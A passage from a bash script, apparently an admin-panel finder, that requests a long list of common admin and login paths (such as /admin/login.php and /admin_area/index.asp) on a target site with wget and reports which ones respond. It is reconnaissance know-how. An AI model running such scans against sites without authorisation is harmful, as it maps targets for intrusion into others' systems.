read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin_login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin_login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin_login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin_login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin_login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin_login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin_login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin-login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin-login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin-login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin-login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin-login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin-login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/adminLogin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin-login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/controlpanel.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/cp.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/home.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/home.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/home.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/home.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/home.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/home.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/home.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/admin/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/admin/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_area/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin_login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin1"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin1.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin1.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin1.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin1.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/admin2"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin2/index.cgi"
